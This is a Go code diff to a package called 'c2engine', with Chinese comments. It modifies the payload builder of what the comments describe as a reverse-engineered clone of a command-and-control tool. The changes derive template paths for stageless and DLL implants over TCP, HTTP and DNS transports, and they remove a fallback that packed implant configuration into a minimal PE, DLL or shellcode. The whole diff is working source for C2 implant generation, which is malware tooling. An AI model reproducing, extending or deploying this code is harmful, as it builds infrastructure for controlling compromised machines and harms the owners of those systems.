@@ -50,6 +50,7 @@ package c2engine
 import (
 	"encoding/binary"
 	"fmt"
+	"io/fs"
 	"os"
 	"path/filepath"
 	"strings"
@@ -67,6 +68,10 @@ type PoPayload struct {
 	// ArgvErr 非空表示 argv 条目未写入（当前是 argv key 未从二进制恢复，
 	// 见 PoArgvEntryReady）；载荷本身仍带完整配置块。
 	ArgvErr error
+	// Err 非空表示本次构建失败（例如模板文件缺失）。错误文本与原版逐字一致，
+	// 由控制器直接回 JsonErr（黑盒：`open stageless/http_windows_amd64: file
+	// does not exist`）。
+	Err error
 }
 
 // PoConfig 是一次构建的配置输入（对应控制器读到的 JSON 参数）。
@@ -87,11 +92,54 @@ type PoConfig struct {
 	VIP     bool
 }
 
+// PoTemplatePath 返回原版模板文件的相对路径。
+//
+// 黑盒（4.9.3，scripts/probe-original.sh）：
+//
+//	stageless?id=1&arch=windows_amd64          -> open stageless/http_windows_amd64: file does not exist
+//	dll?id=1&arch=windows_amd64                -> open dll/http_windows_amd64: file does not exist
+//	listen?...&tp=tcp&arch=windows_amd64       -> open stageless/tcp_windows_amd64: file does not exist
+//	listendll?...&tp=tcp&arch=windows_amd64    -> open dll/tcp_windows_amd64: file does not exist
+//
+// 即：stage/stageless/listen 用 `stageless/<tp>_<arch>`，dll/listendll 用
+// `dll/<tp>_<arch>`；<tp> 是传输模式（监听器 Mode 或请求里的 tp），<arch> 是
+// 面板提交的架构串（如 windows_amd64，含下划线，不再拆分）。
+func PoTemplatePath(mode, tp, arch string) string {
+	dir := "stageless"
+	switch mode {
+	case AgentTypeDLL, AgentTypeListenDLL:
+		dir = "dll"
+	}
+	if tp == "" {
+		tp = "tcp"
+	}
+	if arch == "" {
+		arch = PoDefaultArchSuffix
+	}
+	// DNS 传输使用独立的模板前缀（已还原的家族 A 字符串
+	// "stageless/ebpf_%s_%s"，见 PoTplStagelessEBPF / RE-NOTES E-13）。
+	switch strings.ToLower(tp) {
+	case "dns", "doh", "dot":
+		return filepath.Join(dir, "ebpf_"+tp+"_"+arch)
+	}
+	return filepath.Join(dir, tp+"_"+arch)
+}
+
 // PoBuild 按 PoConfig 构建载荷（所有 DownloadController 分支共用）。
 func PoBuild(l *Listener, cfg PoConfig) *PoPayload {
 	info := poBuildInfo(l, cfg)
 
-	template := poLoadTemplate(info)
+	// 原版从磁盘取预编译模板；缺失时直接报错（文件不存在），不生成外壳。
+	path := PoTemplatePath(cfg.Mode, poTransportMode(cfg, l), cfg.Arch)
+	template, terr := os.ReadFile(path)
+	if terr != nil {
+		return &PoPayload{
+			Mode:     cfg.Mode,
+			Filename: poFilename(cfg, l),
+			MimeType: info.MimeType,
+			Err:      fmt.Errorf("open %s: %w", path, fs.ErrNotExist),
+		}
+	}
 
 	verifier := cfg.VKey
 	salt := cfg.Salt
@@ -125,14 +173,7 @@ func PoBuild(l *Listener, cfg PoConfig) *PoPayload {
 
 	res, err := PatchPoPayload(template, fields, argv)
 	if err != nil {
-		// 模板为空时 PatchPoPayload 返回错误；退化为"配置块 + argv"作为 body，
-		// 保证响应形状与头字段仍与反编译一致。
-		body := PoConfigBlock(fields)
-		res = &PoPatchResult{Data: body, ConfigOffset: 0, ArgvOffset: -1}
-		if len(argv) > 0 {
-			res.ArgvOffset = len(res.Data)
-			res.Data = append(res.Data, argv...)
-		}
+		return &PoPayload{Mode: cfg.Mode, Filename: filename, MimeType: mime, Err: err}
 	}
 
 	p := &PoPayload{
@@ -146,10 +187,6 @@ func PoBuild(l *Listener, cfg PoConfig) *PoPayload {
 		ArgvErr:    argvErr,
 	}
 
-	// 无预编译模板时的外壳包装（已知偏差，见文件头说明）。
-	if p.Template == 0 {
-		p.Data = poWrapStub(info, res.Data, cfg.Mode)
-	}
 	return p
 }
 
@@ -361,38 +398,3 @@ func poIsDNSTransport(cfg PoConfig, l *Listener) bool {
 	return false
 }
 
-// poLoadTemplate 依次尝试磁盘上的预编译产物；找不到返回 nil。
-// 路径与 AgentBuilder/ClientListener 的既有约定一致：
-// agents/agent_<platform>_<arch><ext>。
-func poLoadTemplate(info *AgentBuildInfo) []byte {
-	if info == nil {
-		return nil
-	}
-	name := fmt.Sprintf("agent_%s_%s%s", info.Platform, info.Arch, info.Extension)
-	for _, dir := range []string{"agents", filepath.Join("agents", "export")} {
-		if data, err := os.ReadFile(filepath.Join(dir, name)); err == nil && len(data) > 0 {
-			return data
-		}
-	}
-	return nil
-}
-
-// poWrapStub 在没有预编译模板时，用仓内既有的最小外壳把配置块包成可投递文件。
-// 已知偏差：原版不会生成外壳——其模板在请求时经监听器取回
-// （FUN_005e8cc0(map, 0x441, 0x1ed)），本分支纯属本复刻的替代实现。
-func poWrapStub(info *AgentBuildInfo, body []byte, mode string) []byte {
-	if info == nil {
-		return body
-	}
-	switch info.Format {
-	case "dll", "so":
-		return buildMinimalDLL(body)
-	case "bin":
-		// shellcode：原样返回位置无关字节流。
-		return body
-	case "exe":
-		return MinimalPE(body)
-	default:
-		return body
-	}
-}
